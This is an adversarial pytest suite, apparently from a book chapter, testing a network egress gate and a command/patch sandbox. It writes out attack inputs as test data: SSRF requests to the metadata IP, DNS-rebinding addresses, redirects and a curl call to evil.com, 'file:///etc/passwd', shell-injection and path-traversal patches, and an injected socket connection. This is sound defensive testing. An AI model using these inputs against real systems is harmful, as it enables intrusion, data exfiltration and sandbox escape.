"""Adversarial tests for Chapter 13: the network boundary and the sandbox.

Every test is an ATTACK the chapter claims to stop. If the attack
succeeds, the test fails. Happy paths are asserted only to prove the
gate is not a wall — legitimate traffic must flow.
"""

import os
import sys
import shutil

import pytest

from network_boundary import (
    EgressError,
    GateVerdict,
    HostNotAllowlisted,
    NetworkBoundary,
    RedirectBlocked,
    SchemeDenied,
    SSRFAddressBlocked,
    TooManyRedirects,
    TransportResponse,
    UserinfoDenied,
)
from sandbox import (
    BashResult,
    CommandNotAllowlisted,
    PatchContextMismatch,
    PatchOutsideWorktree,
    PatchRejected,
    Sandbox,
    SandboxPermissionDenied,
    SandboxPermissions,
    SandboxTimeout,
    UnreviewedPatch,
    automated_policy,
)


# --------------------------------------------------------------------------
# Fakes: the boundary never touches the real network in tests.
# --------------------------------------------------------------------------

PUBLIC_IP = "93.184.216.34"  # verified routable by _address_category
PUBLIC_IP_2 = "8.8.8.8"


def make_resolver(mapping):
    def _resolve(host):
        return mapping.get(host, [PUBLIC_IP])

    return _resolve


class FakeTransport:
    """Replays canned response chains; records what it was asked."""

    def __init__(self, routes):
        self.routes = routes
        self.seen = []  # (method, url, timeout)

    def __call__(self, method, url, timeout):
        self.seen.append((method, url, timeout))
        return self.routes.get(url, TransportResponse(404, {}, b"not found"))


def make_boundary(routes, dns, allowlist=(".polygon.io", ".alphavantage.co")):
    return NetworkBoundary(
        allowlist=allowlist,
        transport=FakeTransport(routes),
        resolver=make_resolver(dns),
    )


def ok(body=b"data"):
    return TransportResponse(200, {}, body)


def redirect_to(location):
    return TransportResponse(302, {"location": location}, b"")


# --------------------------------------------------------------------------
# Network boundary: the attacks
# --------------------------------------------------------------------------


def test_metadata_ip_direct_is_blocked():
    b = make_boundary({}, {}, allowlist=("169.254.169.254",))
    # Even allowlisted by name, the ADDRESS is link-local: refused.
    with pytest.raises(SSRFAddressBlocked, match="link-local"):
        b.request("GET", "http://169.254.169.254/latest/meta-data/")


def test_metadata_via_redirect_hop_is_blocked():
    b = make_boundary(
        {
            "http://api.polygon.io/quote": redirect_to(
                "http://169.254.169.254/latest/meta-data/"
            ),
        },
        {"api.polygon.io": [PUBLIC_IP]},
    )
    with pytest.raises(RedirectBlocked):
        b.request("GET", "http://api.polygon.io/quote")


def test_dns_rebinding_private_ip_is_blocked():
    # The hostname is allowlisted; the RESOLVED address is private.
    # The name is not the address — this is the rebinding gap, closed.
    b = make_boundary(
        {"http://api.polygon.io/quote": ok()},
        {"api.polygon.io": ["10.0.0.5"]},
    )
    with pytest.raises(SSRFAddressBlocked, match="private"):
        b.request("GET", "http://api.polygon.io/quote")


def test_dns_rebinding_loopback_is_blocked():
    b = make_boundary(
        {"http://api.polygon.io/quote": ok()},
        {"api.polygon.io": ["127.0.0.1"]},
    )
    with pytest.raises(SSRFAddressBlocked, match="loopback"):
        b.request("GET", "http://api.polygon.io/quote")


def test_allowlist_miss_denied_by_default():
    b = make_boundary({"http://evil.com/x": ok()}, {"evil.com": [PUBLIC_IP]})
    with pytest.raises(HostNotAllowlisted, match="deny by default"):
        b.request("GET", "http://evil.com/x")


def test_wildcard_does_not_match_suffix_attack():
    # ".polygon.io" must NOT match "polygon.io.evil.com".
    b = make_boundary(
        {"http://polygon.io.evil.com/x": ok()},
        {"polygon.io.evil.com": [PUBLIC_IP]},
    )
    with pytest.raises(HostNotAllowlisted):
        b.request("GET", "http://polygon.io.evil.com/x")


def test_redirect_to_evil_host_blocked_at_hop_two():
    b = make_boundary(
        {"http://api.polygon.io/q": redirect_to("http://evil.com/steal")},
        {"api.polygon.io": [PUBLIC_IP], "evil.com": [PUBLIC_IP]},
    )
    with pytest.raises(RedirectBlocked):
        b.request("GET", "http://api.polygon.io/q")


def test_userinfo_in_url_refused():
    b = make_boundary({}, {"api.polygon.io": [PUBLIC_IP]})
    with pytest.raises(UserinfoDenied):
        b.request("GET", "https://user:pass@api.polygon.io/q")


def test_non_http_scheme_refused():
    b = make_boundary({}, {})
    with pytest.raises(SchemeDenied):
        b.request("GET", "file:///etc/passwd")


def test_redirect_loop_eventually_refused():
    routes = {
        "http://api.polygon.io/a": redirect_to("http://api.polygon.io/b"),
        "http://api.polygon.io/b": redirect_to("http://api.polygon.io/a"),
    }
    b = make_boundary(routes, {"api.polygon.io": [PUBLIC_IP]})
    with pytest.raises(TooManyRedirects):
        b.request("GET", "http://api.polygon.io/a")


# --------------------------------------------------------------------------
# Network boundary: legitimate traffic must flow
# --------------------------------------------------------------------------


def test_happy_path_returns_body_and_verdict():
    b = make_boundary(
        {"https://api.polygon.io/v2/aggs/ticker/AAPL/range/1/day/x": ok(b"bars")},
        {"api.polygon.io": [PUBLIC_IP]},
    )
    verdict = b.request(
        "GET", "https://api.polygon.io/v2/aggs/ticker/AAPL/range/1/day/x"
    )
    assert isinstance(verdict, GateVerdict)
    assert verdict.allowed
    assert verdict.response is not None
    assert verdict.response.body == b"bars"
    assert verdict.hops == (
        "https://api.polygon.io/v2/aggs/ticker/AAPL/range/1/day/x",
    )
    assert verdict.resolved_ips == (PUBLIC_IP,)


def test_in_allowlist_redirect_chain_is_followed():
    b = make_boundary(
        {
            "http://api.polygon.io/old": redirect_to(
                "https://api.polygon.io/new"
            ),
            "https://api.polygon.io/new": ok(b"moved"),
        },
        {"api.polygon.io": [PUBLIC_IP]},
    )
    verdict = b.request("GET", "http://api.polygon.io/old")
    assert verdict.response.body == b"moved"
    assert len(verdict.hops) == 2


def test_timeout_is_capped_not_honored():
    transport = FakeTransport({"https://api.polygon.io/q": ok()})
    b = NetworkBoundary(
        allowlist=(".polygon.io",),
        transport=transport,
        resolver=make_resolver({"api.polygon.io": [PUBLIC_IP]}),
        timeout_ceiling=10.0,
    )
    b.request("GET", "https://api.polygon.io/q", timeout=120.0)
    assert transport.seen[0][2] == 10.0  # capped, not 120


def test_nonstandard_port_refused():
    b = make_boundary({}, {"api.polygon.io": [PUBLIC_IP]})
    with pytest.raises(EgressError):
        b.request("GET", "https://api.polygon.io:8443/q")


# --------------------------------------------------------------------------
# Sandbox fixtures
# --------------------------------------------------------------------------


@pytest.fixture()
def worktree(tmp_path):
    d = tmp_path / "worktree"
    d.mkdir()
    return str(d)


@pytest.fixture()
def commands():
    cmds = {}
    if sys.executable:
        cmds["python3"] = sys.executable
    echo = shutil.which("echo")
    if echo:
        cmds["echo"] = echo
    return cmds


@pytest.fixture()
def full_sandbox(worktree, commands):
    return Sandbox(
        worktree,
        SandboxPermissions(can_run_bash=True, can_apply_patch=True),
        commands,
        default_timeout=10.0,
    )


# --------------------------------------------------------------------------
# Sandbox: the process cell under attack
# --------------------------------------------------------------------------


def test_shell_metacharacters_are_literal_not_interpreted(
    full_sandbox, worktree, commands
):
    if "echo" not in commands:
        pytest.skip("no echo on PATH")
    target = os.path.join(worktree, "pwned")
    result = full_sandbox.run_bash(["echo", f"; touch {target}"])
    assert isinstance(result, BashResult)
    assert "; touch" in result.output.decode()
    assert not os.path.exists(target)  # no shell ran the second "command"


def test_command_not_in_allowlist_refused(full_sandbox):
    with pytest.raises(CommandNotAllowlisted):
        full_sandbox.run_bash(["curl", "http://evil.com"])


def test_absolute_path_command_refused(full_sandbox):
    with pytest.raises(CommandNotAllowlisted):
        full_sandbox.run_bash(["/bin/echo", "hi"])


def test_runaway_is_killed_by_timeout(worktree, commands):
    if "python3" not in commands:
        pytest.skip("no python3 available")
    sb = Sandbox(
        worktree,
        SandboxPermissions(can_run_bash=True),
        commands,
        default_timeout=1.0,
    )
    with pytest.raises(SandboxTimeout):
        sb.run_bash(["python3", "-c", "import time; time.sleep(30)"])


def test_oversized_output_truncates_with_flag(worktree, commands):
    if "python3" not in commands:
        pytest.skip("no python3 available")
    sb = Sandbox(
        worktree,
        SandboxPermissions(can_run_bash=True),
        commands,
        default_timeout=10.0,
        output_cap=1000,
    )
    result = sb.run_bash(["python3", "-c", "print('x' * 200000)"])
    assert result.truncated is True
    assert len(result.output) <= 1000


def test_child_env_is_scrubbed(full_sandbox, commands, monkeypatch):
    if "python3" not in commands:
        pytest.skip("no python3 available")
    monkeypatch.setenv("BOOK_TEST_SECRET", "s3cr3t-do-not-leak")
    result = full_sandbox.run_bash(
        ["python3", "-c", "import os; print('BOOK_TEST_SECRET' in os.environ)"]
    )
    assert result.output.decode().strip() == "False"


def test_run_bash_without_permission_refused(worktree, commands):
    sb = Sandbox(
        worktree, SandboxPermissions(can_run_bash=False), commands
    )
    with pytest.raises(SandboxPermissionDenied):
        sb.run_bash(["echo", "hi"])


# --------------------------------------------------------------------------
# Sandbox: the file cell under attack
# --------------------------------------------------------------------------

CLEAN_DIFF = """--- a/strategy.py
+++ b/strategy.py
@@ -1,3 +1,4 @@
 def signal(bars):
-    return "hold"
+    # tuned threshold
+    return "buy"
     # end
"""


def test_approved_patch_applies(full_sandbox, worktree):
    target = os.path.join(worktree, "strategy.py")
    with open(target, "w") as fh:
        fh.write('def signal(bars):\n    return "hold"\n    # end\n')
    proposed = full_sandbox.propose_patch(CLEAN_DIFF)
    reviewed = proposed.review(automated_policy())
    assert reviewed.verdict.approved
    written = full_sandbox.apply(reviewed)
    assert written == [target]
    with open(target) as fh:
        content = fh.read()
    assert 'return "buy"' in content
    assert 'return "hold"' not in content


def test_patch_outside_worktree_refused(full_sandbox):
    evil = """--- a/../../evil.py
+++ b/../../evil.py
@@ -0,0 +1 @@
+print("escaped")
"""
    with pytest.raises(PatchOutsideWorktree):
        full_sandbox.propose_patch(evil)


def test_absolute_patch_target_refused(full_sandbox):
    evil = """--- a//etc/cron.d/evil
+++ b//etc/cron.d/evil
@@ -0,0 +1 @@
+print("escaped")
"""
    with pytest.raises(PatchOutsideWorktree):
        full_sandbox.propose_patch(evil)


def test_symlink_component_refused(full_sandbox, worktree):
    outside = os.path.join(worktree, "..", "outside_link_target")
    os.makedirs(outside, exist_ok=True)
    link = os.path.join(worktree, "sneaky")
    os.symlink(outside, link)
    evil = """--- a/sneaky/evil.py
+++ b/sneaky/evil.py
@@ -0,0 +1 @@
+print("escaped")
"""
    with pytest.raises(PatchOutsideWorktree, match="symlink"):
        full_sandbox.propose_patch(evil)
    assert not os.path.exists(os.path.join(outside, "evil.py"))


def test_unreviewed_patch_never_applies(full_sandbox, worktree):
    from sandbox import ProposedPatch, ReviewedPatch, ReviewVerdict

    target = os.path.join(worktree, "strategy.py")
    with open(target, "w") as fh:
        fh.write('def signal(bars):\n    return "hold"\n    # end\n')
    proposed = full_sandbox.propose_patch(CLEAN_DIFF)
    # A ReviewedPatch with reviewed=False: the Decide step never happened.
    fake = ReviewedPatch(
        proposal=proposed,
        verdict=ReviewVerdict(True, "forged"),
        reviewed=False,
    )
    with pytest.raises(UnreviewedPatch):
        full_sandbox.apply(fake)
    with open(target) as fh:
        assert 'return "hold"' in fh.read()  # untouched


def test_rejected_patch_not_applied(full_sandbox, worktree):
    target = os.path.join(worktree, "strategy.py")
    with open(target, "w") as fh:
        fh.write('def signal(bars):\n    return "hold"\n    # end\n')
    proposed = full_sandbox.propose_patch(CLEAN_DIFF)

    def _no(_summary, _text=""):
        from sandbox import ReviewVerdict

        return ReviewVerdict(False, "human said no")

    reviewed = proposed.review(_no)
    with pytest.raises(PatchRejected):
        full_sandbox.apply(reviewed)
    with open(target) as fh:
        assert 'return "hold"' in fh.read()


def test_context_mismatch_refused_not_fuzzed(full_sandbox, worktree):
    target = os.path.join(worktree, "strategy.py")
    with open(target, "w") as fh:
        fh.write('def signal(bars):\n    return "DIFFERENT"\n    # end\n')
    proposed = full_sandbox.propose_patch(CLEAN_DIFF)
    reviewed = proposed.review(automated_policy())
    with pytest.raises(PatchContextMismatch):
        full_sandbox.apply(reviewed)


def test_new_file_patch_creates_file(full_sandbox, worktree):
    new_file = """--- /dev/null
+++ b/signals/momentum.py
@@ -0,0 +1,2 @@
+def momentum(bars):
+    return "hold"
"""
    proposed = full_sandbox.propose_patch(new_file)
    reviewed = proposed.review(automated_policy())
    written = full_sandbox.apply(reviewed)
    assert written == [os.path.join(worktree, "signals", "momentum.py")]
    assert os.path.isfile(written[0])


def test_apply_patch_without_permission_refused(worktree, commands):
    sb = Sandbox(
        worktree,
        SandboxPermissions(can_run_bash=True, can_apply_patch=False),
        commands,
    )
    with pytest.raises(SandboxPermissionDenied):
        sb.propose_patch(CLEAN_DIFF)


def test_automated_policy_refuses_dangerous_imports(full_sandbox):
    nasty = """--- a/strategy.py
+++ b/strategy.py
@@ -1,2 +1,3 @@
 def signal(bars):
+    import socket; socket.create_connection(("evil.com", 443))
     return "hold"
"""
    proposed = full_sandbox.propose_patch(nasty)
    reviewed = proposed.review(automated_policy())
    assert not reviewed.verdict.approved
    assert "socket" in reviewed.verdict.reason


def test_automated_policy_refuses_oversize_patch(full_sandbox):
    big = (
        "--- a/big.py\n+++ b/big.py\n@@ -1,1 +1,201 @@\n x\n"
        + "".join(f"+line{i}\n" for i in range(201))
    )
    proposed = full_sandbox.propose_patch(big)
    reviewed = proposed.review(automated_policy(max_additions=200))
    assert not reviewed.verdict.approved
